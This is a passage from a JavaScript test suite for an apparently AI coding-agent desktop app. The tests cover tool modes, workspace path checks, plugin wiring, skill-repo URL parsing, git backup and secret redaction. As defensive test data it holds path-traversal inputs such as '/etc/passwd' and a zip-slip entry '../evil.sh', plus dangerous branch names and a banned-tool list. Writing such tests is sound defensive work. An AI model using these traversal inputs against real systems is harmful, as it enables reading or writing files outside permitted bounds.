  assert.ok(src.includes('images: _images'), 'sessionStore.save 必须先剥 images 再落盘')
})

test('toolsForMode：极简只给基础编码，标准不含PTC，PTC全量+定制', () => {
  const all = buildTools({ ws: {}, maxReadBytes: 1024, github: { enabled: () => false } })
  const names = (list) => list.map((t) => t.schema.name)
  const mini = names(toolsForMode(all, 'minimal'))
  for (const must of ['read_file', 'write_file', 'list_dir', 'search_code']) {
    assert.ok(mini.includes(must), `极简应含 ${must}`)
  }
  for (const banned of ['delete_path', 'shell_run', 'screen_look', 'gh_commit', 'spawn_subagent', 'propose_plan', 'update_plan_step']) {
    assert.equal(mini.includes(banned), false, `极简不应含 ${banned}`)
  }
  const std = names(toolsForMode(all, 'standard'))
  assert.ok(std.includes('shell_run') || std.includes('gh_commit') || std.includes('spawn_subagent'), '标准应有原有全能力')
  for (const p of PTC_TOOL_NAMES) assert.equal(std.includes(p), false, `标准不应含 PTC 定制 ${p}`)
  const ptc = names(toolsForMode(all, 'ptc'))
  for (const p of PTC_TOOL_NAMES) assert.ok(ptc.includes(p), `PTC 应含定制 ${p}`)
  assert.ok(ptc.includes('shell_run') || ptc.includes('write_file'), 'PTC 应含标准全能力')
  assert.ok(MINIMAL_TOOL_NAMES.has('read_file') && !MINIMAL_TOOL_NAMES.has('delete_path'))
})

test('ptcPlan：建表/确认/更新/越界报错/清表', () => {
  const run = 'test-run-ptc'
  clearPlan(run)
  assert.equal(getPlan(run), null)
  const p = setPlan(run, [{ title: '第一步' }, { title: '第二步', detail: '补充' }])
  assert.equal(p.confirmed, false)
  assert.equal(p.steps.length, 2)
  assert.ok(formatPlan(getPlan(run)).includes('第一步'))
  assert.throws(() => updatePlanStep(run, 0, 'done'), /越界/)
  assert.throws(() => updatePlanStep(run, 3, 'done'), /越界/)
  assert.throws(() => setPlan(run, []), /至少/)
  const u = updatePlanStep(run, 1, 'doing', '开工')
  assert.equal(u.steps[0].status, 'doing')
  assert.match(u.steps[0].detail, /开工/)
  clearPlan(run)
  assert.equal(getPlan(run), null)
})

/* ------------------------------------------------------------------ */
/* 屏幕：贝塞尔轨迹与按键映射                                           */
/* ------------------------------------------------------------------ */

test('bezierPath 起点终点正确且点数符合预期', () => {
  const path = bezierPath({ x: 0, y: 0 }, { x: 100, y: 50 }, 10)
  assert.equal(path.length, 10)
  // 末点必须精确落在目标上，否则点击会偏
  assert.equal(path[path.length - 1].x, 100)
  assert.equal(path[path.length - 1].y, 50)
  // 所有点都是整数坐标
  for (const p of path) {
    assert.ok(Number.isInteger(p.x) && Number.isInteger(p.y))
  }
})

test('bezierPath 在同一点上不产生 NaN', () => {
  const path = bezierPath({ x: 5, y: 5 }, { x: 5, y: 5 }, 6)
  for (const p of path) {
    assert.ok(Number.isFinite(p.x) && Number.isFinite(p.y), '零距离路径不应产生 NaN')
  }
})

test('resolveVirtualKey 支持字母数字与命名键，拒绝未知键', () => {
  assert.equal(resolveVirtualKey('a'), 0x41)
  assert.equal(resolveVirtualKey('Z'), 0x5a)
  assert.equal(resolveVirtualKey('5'), 0x35)
  assert.equal(resolveVirtualKey('Enter'), 0x0d)
  assert.equal(resolveVirtualKey('escape'), 0x1b)
  assert.equal(resolveVirtualKey('F5'), 0x74)
  assert.equal(resolveVirtualKey('nosuchkey'), null)
})

/* ------------------------------------------------------------------ */
/* 工作区路径越界判断                                                   */
/* ------------------------------------------------------------------ */

test('pathEscapesWorkspace 识别越界与绝对路径', () => {
  assert.equal(pathEscapesWorkspace('src/index.ts'), false)
  assert.equal(pathEscapesWorkspace('a/b/c.txt'), false)
  assert.equal(pathEscapesWorkspace('../outside.txt'), true)
  assert.equal(pathEscapesWorkspace('src/../../out.txt'), true)
  assert.equal(pathEscapesWorkspace('/etc/passwd'), true)
  assert.equal(pathEscapesWorkspace('C:\\Windows\\x'), true)
  // 只是名字里含点号的文件不算越界
  assert.equal(pathEscapesWorkspace('a..b.txt'), false)
})

/* ------------------------------------------------------------------ */
/* 源码编码完整性（防回归）                                             */
/* ------------------------------------------------------------------ */

/**
 * 门禁：源文件里不允许出现 U+FFFD。
 *
 * 背景：在 Windows PowerShell 5.1 下用 Get-Content / Set-Content 处理 UTF-8
 * 源文件时，内容会先按代码页 936（GBK）解码再以 UTF-8 写出，非 ASCII 字符
 * 会被静默替换成 U+FFFD，且不可逆。这类损坏编译不一定报错，却会悄悄改掉
 * 界面文案。此测试让它在 CI / npm test 阶段立刻暴露。
 */
test('源码不含 U+FFFD 替换字符（编码损坏门禁）', () => {
  const EXT = new Set(['.ts', '.tsx', '.mts', '.js', '.mjs', '.json', '.css', '.html'])
  const SKIP = new Set(['node_modules', 'out', 'dist', '.git', 'shots'])
  const damaged = []

  const walk = (dir) => {
    for (const name of readdirSync(dir)) {
      if (SKIP.has(name)) continue
      const full = join(dir, name)
      if (statSync(full).isDirectory()) {
        walk(full)
        continue
      }
      const dot = name.lastIndexOf('.')
      if (dot < 0 || !EXT.has(name.slice(dot))) continue
      const text = readFileSync(full, 'utf8')
      const n = (text.match(/\uFFFD/g) || []).length
      if (n) damaged.push(`${full}（${n} 处）`)
    }
  }
  walk('.')

  assert.deepEqual(damaged, [], `以下文件含 U+FFFD，疑似编码损坏：\n${damaged.join('\n')}`)
})

test('index.ts 保留了主进程关键接线（重建后防回归）', () => {
  const src = readFileSync('src/main/index.ts', 'utf8')
  // 这些是应用能否启动与权限模型能否生效的关键符号，缺一个都说明文件被截断
  for (const symbol of [
    'registerPluginProtocol',
    'createWindow',
    'registerIpc',
    'assembleDeps',
    'toScreenCoords',
    'resolveShellCwd',
    'runSmokeTest',
    'requestApprovalFor'
  ]) {
    assert.ok(src.includes(symbol), `src/main/index.ts 缺少 ${symbol}`)
  }
  // 截图绝不能写进会话：持久化前必须剔除 images
  assert.ok(src.includes('images: _images'), 'src/main/index.ts 未在持久化前剔除截图')
  // 临时截图脚手架不应残留在生产代码里
  for (const leftover of ['runShotTask', 'LAGENT_SHOT_DIR', 'SETTINGS_DETAIL']) {
    assert.equal(src.includes(leftover), false, `src/main/index.ts 残留临时脚手架 ${leftover}`)
  }
})

/* ------------------------------------------------------------------ */
/* 插件桥的两个历史坑（防回归）                                          */
/* ------------------------------------------------------------------ */

test('worker 不会把已有的 file:// 入口再编码一次', async () => {
  const src = readFileSync('src/main/plugins/worker.mjs', 'utf8')
  // 历史上写成 `import(pathToFileURL(entry).href)`，而宿主传进来的 entry 已经是
  // file:// URL，二次编码会得到 file:\C:\... 这种畸形路径，插件全部加载失败。
  // 现在必须先探测再转换。
  assert.ok(src.includes('entryToUrl'), 'worker.mjs 应通过 entryToUrl 归一化入口路径')
  assert.equal(
    /import\(pathToFileURL\(entry\)/.test(src),
    false,
    'worker.mjs 不应无条件对 entry 再调用 pathToFileURL'
  )
})

test('插件失败时保留结构化错误，不被「退出码」盖掉', () => {
  const src = readFileSync('src/main/plugins/index.ts', 'utf8')
  // 历史上先判断 code !== 0 就 reject，导致 worker 写在 stdout 的
  // { ok:false, error } 被丢弃，插件作者只看到"插件退出码 1"。
  const exitBlock = src.slice(src.indexOf("child.on('exit'"))
  const parseIdx = exitBlock.indexOf('JSON.parse(raw)')
  const codeIdx = exitBlock.indexOf('code !== 0')
  assert.ok(parseIdx >= 0, '应在 exit 回调里尝试解析 stdout 载荷')
  assert.ok(codeIdx >= 0, '应保留退出码兜底分支')
  assert.ok(parseIdx < codeIdx, '必须先解析 stdout 载荷，再回退到退出码判断')
})

test('插件面板调用接上了宿主桥与工作区', () => {
  const src = readFileSync('src/main/plugins/index.ts', 'utf8')
  const invokeBody = src.slice(src.indexOf('async invoke('), src.indexOf('async toolDefinitions('))
  // 历史上 invoke 调 callPlugin 时不传 onRequest，面板里任何 api.readFile 都会挂死
  assert.ok(invokeBody.includes('handlePluginRequest'), 'invoke 应把宿主桥接进 callPlugin')
  assert.ok(invokeBody.includes('hooks.deps'), 'invoke 应接收并转交 deps')
})

/* ------------------------------------------------------------------ */
/* 视觉链路：截图不得落盘（隐私关键）                                    */
/* ------------------------------------------------------------------ */

test('截图只在一轮内使用，持久化前必须剔除 images', () => {
  const idx = readFileSync('src/main/index.ts', 'utf8')
  // save 之前必须先把 images 摘掉，否则截图会永久写进会话文件
  assert.ok(idx.includes('images: _images'), '主进程应在 sessionStore.save 前剥离 images')

  const runnerSrc = readFileSync('src/main/agent/runner.ts', 'utf8')
  // 截图累积在内存里，且有上限，避免长会话把内存撑爆
  assert.ok(runnerSrc.includes('pendingImages'), 'runner 应用 pendingImages 承载本轮截图')
  const cap = runnerSrc.match(/pendingImages\.length > (\d+)/)
  assert.ok(cap, 'pendingImages 必须有长度上限')
  assert.ok(Number(cap[1]) <= 5, `pendingImages 上限应较小，实际 ${cap[1]}`)
})

test('两家协议都能把图片编码进请求', () => {
  const openaiSrc = readFileSync('src/main/providers/openai.ts', 'utf8')
  const anthropicSrc = readFileSync('src/main/providers/anthropic.ts', 'utf8')
  // OpenAI 兼容：content parts + data URL
  assert.ok(openaiSrc.includes('image_url'), 'OpenAI 适配器应输出 image_url part')
  assert.ok(openaiSrc.includes('data:${img.mediaType};base64,'), 'OpenAI 应用 data URL 传图')
  // Anthropic：base64 source block
  assert.ok(anthropicSrc.includes("type: 'image'"), 'Anthropic 适配器应输出 image block')
  assert.ok(anthropicSrc.includes("type: 'base64'"), 'Anthropic 应用 base64 source')
  // 图片不能挂在 tool 消息上——两家协议的 tool 结果都不支持带图
  const runnerSrc = readFileSync('src/main/agent/runner.ts', 'utf8')
  assert.ok(runnerSrc.includes("m.role === 'tool'"), 'attachImages 应跳过 tool 消息')
})

/* ------------------------------------------------------------------ */
/* 0.1.3：远端 skill 链接解析（纯函数，直接测）                           */
/* ------------------------------------------------------------------ */

test('parseSkillRepoUrl 支持 7 种链接形态', () => {
  assert.deepEqual(parseSkillRepoUrl('https://github.com/owner/repo'), { owner: 'owner', repo: 'repo', ref: null, path: null })
  assert.deepEqual(parseSkillRepoUrl('https://github.com/owner/repo.git'), { owner: 'owner', repo: 'repo', ref: null, path: null })
  assert.deepEqual(parseSkillRepoUrl('https://github.com/owner/repo/tree/main/skills/a'), { owner: 'owner', repo: 'repo', ref: 'main', path: 'skills/a' })
  assert.deepEqual(parseSkillRepoUrl('https://github.com/owner/repo/blob/v1.0/SKILL.md'), { owner: 'owner', repo: 'repo', ref: 'v1.0', path: 'SKILL.md' })
  assert.deepEqual(parseSkillRepoUrl('https://raw.githubusercontent.com/owner/repo/main/skills/a/SKILL.md'), { owner: 'owner', repo: 'repo', ref: 'main', path: 'skills/a/SKILL.md' })
  assert.deepEqual(parseSkillRepoUrl('git@github.com:owner/repo.git'), { owner: 'owner', repo: 'repo', ref: null, path: null })
  assert.deepEqual(parseSkillRepoUrl('owner/repo'), { owner: 'owner', repo: 'repo', ref: null, path: null })
})

test('parseSkillRepoUrl 拒绝空链接、坏域名与缺段链接', () => {
  assert.throws(() => parseSkillRepoUrl(''), /不能为空/)
  assert.throws(() => parseSkillRepoUrl('https://gitlab.com/owner/repo'), /不支持的域名/)
  assert.throws(() => parseSkillRepoUrl('https://github.com/onlyowner'), /owner\/repo/)
})

test('findSkillRoots 祖先优先、大小写不敏感、按深度排序', () => {
  // 仓库根有 SKILL.md 时祖先优先，其余后代全部视为其一部分
  assert.deepEqual(findSkillRoots(['SKILL.md', 'a/SKILL.md', 'd/Skill.MD']), [''])
  const roots = findSkillRoots(['a/SKILL.md', 'a/b/SKILL.md', 'c/notes.md', 'd/Skill.MD'])
  assert.deepEqual(roots, ['a', 'd'])
  const nested = findSkillRoots(['x/SKILL.md', 'x/y/SKILL.md', 'z/SKILL.md'])
  assert.deepEqual(nested, ['x', 'z'])
})

test('stripZipRoot 去掉公共顶层并跳过越界与隐藏条目', () => {
  const out = stripZipRoot([
    { name: 'owner-repo-abc/SKILL.md', isDir: false, data: Buffer.from('hi') },
    { name: 'owner-repo-abc/sub/a.txt', isDir: false, data: Buffer.from('a') },
    { name: 'owner-repo-abc/__MACOSX/x', isDir: false, data: Buffer.from('x') },
    { name: 'owner-repo-abc/../evil.sh', isDir: false, data: Buffer.from('evil') },
    { name: 'owner-repo-abc/empty/', isDir: true, data: Buffer.alloc(0) }
  ])
  assert.deepEqual(out.map((e) => e.path).sort(), ['SKILL.md', 'sub/a.txt'])
})

/* ------------------------------------------------------------------ */
/* 0.1.3：死通道接线 + 会话回归（源码门禁，防回退）                        */
/* ------------------------------------------------------------------ */

test('死通道已接线：skillImportRepo/skillSync/toolsList 主进程有 handler 且 preload 有暴露', () => {
  const idx = readFileSync('src/main/index.ts', 'utf8')
  for (const ch of ['CH.skillImportRepo', 'CH.skillSync', 'CH.toolsList']) {
    assert.ok(idx.includes(ch), `src/main/index.ts 缺少 ${ch} 接线`)
  }
  const pre = readFileSync('src/preload/index.ts', 'utf8')
  for (const ch of ['CH.skillImportRepo', 'CH.skillSync', 'CH.toolsList']) {
    assert.ok(pre.includes(ch), `src/preload/index.ts 未暴露 ${ch}`)
  }
})

test('skill_read 在生产环境可注册：assembleDeps 接了 skills 且 SkillManager 有 readResource', () => {
  const idx = readFileSync('src/main/index.ts', 'utf8')
  const depsBody = idx.slice(idx.indexOf('async function assembleDeps'), idx.indexOf('function resolveShellCwd'))
  assert.ok(depsBody.includes('skills:'), 'assembleDeps 必须提供 skills 依赖')
  assert.ok(depsBody.includes('readResource'), 'skills 依赖必须含 readResource')
  const skillsSrc = readFileSync('src/main/skills/index.ts', 'utf8')
  assert.ok(skillsSrc.includes('async readResource('), 'SkillManager 缺少 readResource 实现')
  assert.ok(skillsSrc.includes('async importRepo('), 'SkillManager 缺少 importRepo 实现')
  assert.ok(skillsSrc.includes('async sync('), 'SkillManager 缺少 sync 实现')
})

test('插件保留名单动态同步：不再硬编码内置工具名', () => {
  const src = readFileSync('src/main/plugins/index.ts', 'utf8')
  const body = src.slice(src.indexOf('async toolDefinitions('), src.indexOf('function toMeta('))
  assert.ok(body.includes('buildTools(deps)'), 'toolDefinitions 应从 buildTools 动态取保留名单')
  // 硬编码名单里的字面量不应再出现（出现即说明又写死了）
  for (const name of ["'screen_click'", "'gh_commit'", "'list_all_files'"]) {
    assert.equal(body.includes(name), false, `toolDefinitions 残留硬编码 ${name}`)
  }
})

test('sessions 写序列化 + 损坏备份 + 目标切换不顶列表', () => {
  const src = readFileSync('src/main/sessions.ts', 'utf8')
  assert.ok(src.includes('writeQueue'), 'sessions.ts 应有写序列化队列')
  assert.ok(src.includes('.corrupt-'), 'sessions.ts 损坏时应备份而不是静默丢弃')
  assert.ok(src.includes('contentSame'), 'save 应区分内容变更与纯目标切换')
})

test('会话目标落盘对称：切目标/新建/发送三处一致', () => {
  const app = readFileSync('src/renderer/src/App.tsx', 'utf8')
  assert.ok(app.includes('repoTarget: r'), 'pickRepoTarget 必须把仓库目标写进会话记录')
  assert.ok(app.includes('repoTarget: id ? null : session.repoTarget'), 'pickWorkspace 必须同步会话记录的目标')
  const newBody = app.slice(app.indexOf('const newSession'), app.indexOf('const openSession'))
  assert.ok(newBody.includes('setRepoTarget(null)'), 'newSession 必须清除上一个会话的仓库目标')
  const idx = readFileSync('src/main/index.ts', 'utf8')
  assert.ok(idx.includes('workspaceId: repoTarget ? null : (payload.workspaceId'), 'runSingleChat 必须把本轮目标落盘')
})

test('Anthropic 自定义请求头同样透传（测试连接与拉模型）', () => {
  const idx = readFileSync('src/main/index.ts', 'utf8')
  const matches = idx.match(/'anthropic-version': '2023-06-01', \.\.\.\(p\.headers \?\? \{\}\)/g) || []
  assert.equal(matches.length, 2, 'providerTest 与 providerModels 的 anthropic 分支都应透传 headers')
})

/* ------------------------------------------------------------------ */
/* 自动备份：纯函数（直接测真实实现）                                     */
/* ------------------------------------------------------------------ */

test('clampIntervalMinutes 钳制 5~1440，非法回落 30', () => {
  assert.equal(clampIntervalMinutes(30), 30)
  assert.equal(clampIntervalMinutes(0), 5)
  assert.equal(clampIntervalMinutes(1), 5)
  assert.equal(clampIntervalMinutes(2000), 1440)
  assert.equal(clampIntervalMinutes('xx'), 30)
  assert.equal(clampIntervalMinutes(undefined), 30)
  assert.equal(clampIntervalMinutes(45.9), 45)
})

test('sanitizeBranch 放行合法名，拒绝危险名', () => {
  assert.equal(sanitizeBranch('lagent-backup'), 'lagent-backup')
  assert.equal(sanitizeBranch('  main  '), 'main')
  assert.equal(sanitizeBranch('feat/a-b_c.d'), 'feat/a-b_c.d')
  for (const bad of ['', 'HEAD', 'a..b', 'a b', 'a~b', 'a^b', 'a:b', '-x', '/x', 'x/', 'x.lock', 'a*b']) {
    assert.throws(() => sanitizeBranch(bad), /不能为空|HEAD|不合法/, `应拒绝分支名：${bad}`)
  }
})

test('validateBackupConfig 按目标校验必填项', () => {
  const base = {
    enabled: false,
    target: 'local',
    localPath: '/tmp/b.git',
    githubOwner: '',
    githubRepo: '',
    customUrl: '',
    branch: 'lagent-backup',
    intervalMinutes: 30
  }
  assert.doesNotThrow(() => validateBackupConfig(base))
  assert.throws(() => validateBackupConfig({ ...base, localPath: '  ' }), /裸仓库目录/)
  assert.throws(() => validateBackupConfig({ ...base, branch: 'a..b' }), /不合法/)
  const gh = { ...base, target: 'github', githubOwner: 'octo', githubRepo: 'bk' }
  assert.doesNotThrow(() => validateBackupConfig(gh))
  assert.throws(() => validateBackupConfig({ ...gh, githubOwner: 'a/b' }), /所有者/)
  assert.throws(() => validateBackupConfig({ ...gh, githubRepo: '' }), /仓库名/)
  const cu = { ...base, target: 'custom', customUrl: 'https://gitcode.com/u/r.git' }
  assert.doesNotThrow(() => validateBackupConfig(cu))
  assert.doesNotThrow(() => validateBackupConfig({ ...cu, customUrl: 'git@gitcode.com:u/r.git' }))
  assert.throws(() => validateBackupConfig({ ...cu, customUrl: 'ftp://x/y' }), /不支持/)
  assert.throws(() => validateBackupConfig({ ...cu, customUrl: '' }), /远端 URL/)
})

test('buildBackupRemoteUrl 三种目标组装正确，缺凭据明确报错', () => {
  const base = {
    enabled: false,
    target: 'local',
    localPath: 'D:\\bk\\a.git',
    githubOwner: '',
    githubRepo: '',
    customUrl: '',
    branch: 'lagent-backup',
    intervalMinutes: 30
  }
  assert.equal(buildBackupRemoteUrl(base, { github: null, custom: null }), 'D:\\bk\\a.git')
  const gh = { ...base, target: 'github', githubOwner: 'octo', githubRepo: 'bk' }
  assert.equal(
    buildBackupRemoteUrl(gh, { github: 'tok123', custom: null }),
    'https://x-access-token:tok123@github.com/octo/bk.git'
  )
  assert.throws(() => buildBackupRemoteUrl(gh, { github: null, custom: null }), /访问令牌/)
  const cu = { ...base, target: 'custom', customUrl: 'https://gitcode.com/u/r.git' }
  assert.equal(
    buildBackupRemoteUrl(cu, { github: null, custom: 's3cret' }),
    'https://oauth2:s3cret@gitcode.com/u/r.git'
  )
  // URL 自带凭据时不二次注入
  assert.equal(
    buildBackupRemoteUrl({ ...cu, customUrl: 'https://u:p@host/r.git' }, { github: null, custom: 's3cret' }),
    'https://u:p@host/r.git'
  )
  // ssh 远端原样返回
  assert.equal(
    buildBackupRemoteUrl({ ...cu, customUrl: 'git@gitcode.com:u/r.git' }, { github: null, custom: 's3cret' }),
    'git@gitcode.com:u/r.git'
  )
})

test('redactSecrets 脱掉 URL 中的 userinfo，令牌止于日志之外', () => {
  assert.equal(
    redactSecrets('git push 失败：https://x-access-token:tok123@github.com/octo/bk.git'),
    'git push 失败：https://***@github.com/octo/bk.git'
  )
  assert.equal(redactSecrets('无凭据的纯文本原样保留'), '无凭据的纯文本原样保留')
})

test('formatBackupMessage 前缀固定、时间格式稳定', () => {
  assert.match(formatBackupMessage(new Date(2026, 9, 8, 7, 5)), /^lagent 自动备份 2026-10-08 07:05$/)
})

/* ------------------------------------------------------------------ */
/* 自动备份：有 git 时跑一次真实端到端（本地裸仓库，无网络）               */
/* ------------------------------------------------------------------ */

const HAS_GIT = await (async () => {
  try {
    const { spawnSync } = await import('node:child_process')
    return spawnSync('git', ['--version']).status === 0
  } catch {
    return false
  }
})()

test(
  'BackupManager 本地端到端：提交→推送→干净跳过',
  { skip: !HAS_GIT && '本机无 git，跳过真实备份演练' },
  async () => {
    const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const { spawnSync } = await import('node:child_process')
    const root = mkdtempSync(join(tmpdir(), 'lagent-backup-test-'))
    try {
      const wsPath = join(root, 'ws')
      const barePath = join(root, 'bare.git')
      mkdirSync(wsPath, { recursive: true })
      writeFileSync(join(wsPath, 'a.txt'), 'hello')
      // 工作区里放一个 node_modules：没有 .gitignore 时应被自动忽略
      mkdirSync(join(wsPath, 'node_modules'), { recursive: true })
      writeFileSync(join(wsPath, 'node_modules', 'dep.js'), 'x'.repeat(100))

      const mgr = new BackupManager({
        getBackupConfig: async () => ({
          enabled: false,
          target: 'local',
          localPath: barePath,
          githubOwner: '',
          githubRepo: '',
          customUrl: '',
          branch: 'lagent-backup',
          intervalMinutes: 30
        }),
        listWorkspaces: async () => [{ id: 'w1', name: 'ws', path: wsPath, addedAt: 0, ignore: [] }],
        getGitHubToken: async () => null,
        getCustomToken: async () => null,
        setCustomToken: async () => undefined,
        statusFile: () => join(root, 'backup-status.json'),
        emit: () => undefined
      })

      const s1 = await mgr.runNow()
      assert.equal(s1.results.length, 1)
      assert.equal(s1.results[0].ok, true, s1.results[0].message)
      assert.ok(s1.results[0].commitSha)
      // 远端裸仓库里确实有这个提交
      const log = spawnSync('git', ['--git-dir=' + barePath, 'log', '--oneline', 'lagent-backup'], {
        encoding: 'utf8'
      })
      assert.equal(log.status, 0)
      assert.match(log.stdout, /lagent 自动备份/)
      // node_modules 不应进备份（.gitignore 自动生效）
      const ls = spawnSync('git', ['--git-dir=' + barePath, 'ls-tree', '-r', '--name-only', 'lagent-backup'], {
        encoding: 'utf8'
      })
      assert.ok(!ls.stdout.includes('node_modules'), 'node_modules 不应被备份')

      // 无改动再跑一次：应干净跳过，不产生新提交
      const s2 = await mgr.runNow()
      assert.equal(s2.results[0].ok, true)
      assert.equal(s2.results[0].clean, true)
      const count = spawnSync('git', ['--git-dir=' + barePath, 'rev-list', '--count', 'lagent-backup'], {
        encoding: 'utf8'
      })
      assert.equal(count.stdout.trim(), '1')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  }
)

/* ------------------------------------------------------------------ */
/* 自动备份：接线门禁（防回退）                                           */
/* ------------------------------------------------------------------ */

test('备份通道接线完整：IPC→主进程→preload→设置默认值→冒烟覆盖', () => {
  const ipc = readFileSync('src/shared/ipc.ts', 'utf8')
  for (const ch of ['backupStatus', 'backupRun', 'backupTest', 'backupCreateRepo', 'backupSetToken', 'backupPickDir']) {
    assert.ok(ipc.includes(ch), `ipc.ts 缺少 ${ch}`)
  }
  const idx = readFileSync('src/main/index.ts', 'utf8')
  assert.ok(idx.includes('CH.backupStatus'), '主进程未注册备份通道')
  assert.ok(idx.includes('backupManager.startScheduler()'), '主进程未启动备份轮询')
  // 备份只用独立远端名，绝不能出现操作 origin 的代码
  const bk = readFileSync('src/main/backup.ts', 'utf8')
  assert.ok(bk.includes("BACKUP_REMOTE_NAME = 'lagent-backup'"), '远端名必须为独立名称')
  // 只允许注释里提到 origin，正经代码里不许出现该字面量（远端名走常量）
  assert.equal(/['"]origin['"]/.test(bk), false, '备份代码不应硬编码 origin 远端')
  assert.ok(bk.includes('GIT_TERMINAL_PROMPT'), '必须禁用 git 交互式凭据提示')
  assert.ok(bk.includes('redactSecrets'), '报错必须经过脱敏')
  const pre = readFileSync('src/preload/index.ts', 'utf8')
  assert.ok(pre.includes('CH.backupStatus'), 'preload 未暴露备份 API')
  assert.ok(idx.includes("'backup','app'"), '冒烟测试未覆盖 backup API')
  const store = readFileSync('src/main/store.ts', 'utf8')
  assert.ok(store.includes('intervalMinutes'), '默认设置缺少备份配置')
  const view = readFileSync('src/renderer/src/components/SettingsView.tsx', 'utf8')
  assert.ok(view.includes('BackupSection'), '设置页缺少备份区')
})

/* ------------------------------------------------------------------ */
/* 任务足迹：纯函数（直接测真实实现）                                     */
/* ------------------------------------------------------------------ */

test('toolLabel 覆盖内置工具与插件工具', () => {
  assert.equal(toolLabel('read_file'), '读取文件')
  assert.equal(toolLabel('write_file'), '写入文件')
  assert.equal(toolLabel('gh_commit'), '提交到 GitHub')
  assert.equal(toolLabel('spawn_subagent'), '派生子代理')
  assert.equal(toolLabel('plugin_demo_count_lines'), '插件 demo · count_lines')
  assert.equal(toolLabel('some_unknown_tool'), 'some_unknown_tool')
})

test('summarizeTools 无调用时返回 null，有调用时汇总工具与改动文件', () => {
  assert.equal(summarizeTools({ toolCalls: [] }, []), null)
  assert.equal(summarizeTools({}, []), null)
  const fp = summarizeTools(
    {
      toolCalls: [
        { id: 'c1', name: 'read_file', argsJson: '{"path":"a.ts"}' },
        { id: 'c2', name: 'read_file', argsJson: '{"path":"b.ts"}' },
        { id: 'c3', name: 'write_file', argsJson: '{"path":"a.ts","content":"x"}' }
      ]
    },
    [
      { toolCallId: 'c1', content: '文件 a.ts…' },
      { toolCallId: 'c2', content: '文件 b.ts…' },
      { toolCallId: 'c3', content: '已更新 a.ts…' }
    ]
  )
  assert.ok(fp)
  assert.deepEqual(
    fp.tools.map((t) => [t.label, t.count, t.failed]),
    [
      ['读取文件', 2, false],
      ['写入文件', 1, false]
    ]
  )
  // 读操作不算改动，只有写进名单
  assert.deepEqual(fp.files, ['a.ts'])
  assert.equal(fp.failures, 0)
  assert.equal(fp.unknown, 0)
})

test('summarizeTools 识别失败/拒绝/拦截，失败的写入不进改动名单', () => {
  const fp = summarizeTools(
    {
      toolCalls: [
        { id: 'c1', name: 'write_file', argsJson: '{"path":"a.ts","content":"x"}' },
        { id: 'c2', name: 'delete_path', argsJson: '{"path":"old.txt"}' },
        { id: 'c3', name: 'shell_run', argsJson: '{"command":"x"}' }
      ]
    },
    [
      { toolCallId: 'c1', content: '操作失败：用户拒绝了…' },
      { toolCallId: 'c2', content: '已删除文件 old.txt' }
      // c3 无结果：轮次被中断
    ]
  )
  assert.ok(fp)
  assert.equal(fp.failures, 1)
  assert.equal(fp.unknown, 1)
  assert.deepEqual(fp.files, ['old.txt'])
  assert.equal(fp.tools.find((t) => t.name === 'write_file').failed, true)
})

test('summarizeTools 解析 gh_commit 的多文件与脏参数', () => {
  const fp = summarizeTools(
    {
      toolCalls: [
        {
          id: 'c1',
          name: 'gh_commit',
          argsJson: JSON.stringify({
            files: JSON.stringify([{ path: 'a.ts', content: 'x' }, { path: 'b.md', delete: true }])
          })
        },
        { id: 'c2', name: 'move_path', argsJson: '{"from":"x.ts","to":"y.ts"}' },
        { id: 'c3', name: 'read_file', argsJson: '{bad json' }
      ]
    },
    [
      { toolCallId: 'c1', content: '已提交…' },
      { toolCallId: 'c2', content: '已移动…' },
      { toolCallId: 'c3', content: 'ok' }
    ]
  )
  assert.ok(fp)
  assert.deepEqual(fp.files, ['a.ts', 'b.md', 'x.ts', 'y.ts'])
})

test('groupMessagesForView 把 tool 消息挂到 assistant 下，孤立丢弃', () => {
  const groups = groupMessagesForView([
    { id: 'u1', role: 'user', content: 'hi', createdAt: 0 },
    { id: 'a1', role: 'assistant', content: 'ok', createdAt: 0 },
    { id: 't1', role: 'tool', content: 'r1', createdAt: 0 },
    { id: 't2', role: 'tool', content: 'r2', createdAt: 0 },
    { id: 'a2', role: 'assistant', content: 'done', createdAt: 0 },
    { id: 't9', role: 'tool', content: '孤立', createdAt: 0 }
  ])
  assert.equal(groups.length, 3)
  assert.deepEqual(groups[1].tools.map((t) => t.id), ['t1', 't2'])
  // t9 紧跟在 assistant 后面，照规则归到 a2 名下；真正的孤立（首条即 tool）才丢弃
  assert.deepEqual(groups[2].tools.map((t) => t.id), ['t9'])
  const orphan = groupMessagesForView([{ id: 't0', role: 'tool', content: 'x', createdAt: 0 }])
  assert.deepEqual(orphan, [])
})

/* ------------------------------------------------------------------ */
/* 优化项接线门禁（防回退）                                               */
/* ------------------------------------------------------------------ */

test('足迹渲染接线：分组+足迹行+样式三处齐全', () => {
  for (const f of ['src/renderer/src/components/ChatView.tsx', 'src/renderer/src/components/GroupView.tsx']) {
    const src = readFileSync(f, 'utf8')
    assert.ok(src.includes('groupMessagesForView'), `${f} 未使用分组渲染`)
  }
  const msg = readFileSync('src/renderer/src/components/Message.tsx', 'utf8')
  assert.ok(msg.includes('msg-footprint'), 'MessageView 未渲染足迹行')
  assert.ok(!msg.includes('const TOOL_LABEL'), '工具名对照应收敛到 footprint，不再各写一份')
  const css = readFileSync('src/renderer/src/styles.css', 'utf8')
  assert.ok(css.includes('.msg-footprint'), '样式缺少 .msg-footprint')
})

test('备份可见性接线：事件+历史+失败提醒齐全', () => {
  const ipc = readFileSync('src/shared/ipc.ts', 'utf8')
  assert.ok(ipc.includes('backupEvent'), 'ipc.ts 缺少 backupEvent')
  const bk = readFileSync('src/main/backup.ts', 'utf8')
  assert.ok(bk.includes("type: 'workspace-start'"), '备份未推送开始事件')
  assert.ok(bk.includes("type: 'workspace-done'"), '备份未推送完成事件')
  assert.ok(bk.includes('MAX_HISTORY'), '备份历史未做条数上限')
  assert.ok(bk.includes('mapLimit'), '多工作区未做限流并发')
  // 先看后加：干净时跳过 add，大仓库轮询省一次索引重写
  const body = bk.slice(bk.indexOf('private async backupOne'))
  const statusIdx = body.indexOf("runGit(['status', '--porcelain']")
  const addIdx = body.indexOf("runGit(['add', '-A']")
  assert.ok(statusIdx >= 0 && addIdx > statusIdx, '应先 status 再 add，干净直接返回')
  const pre = readFileSync('src/preload/index.ts', 'utf8')
  assert.ok(pre.includes('CH.backupEvent'), 'preload 未暴露备份事件订阅')
  const view = readFileSync('src/renderer/src/components/SettingsView.tsx', 'utf8')
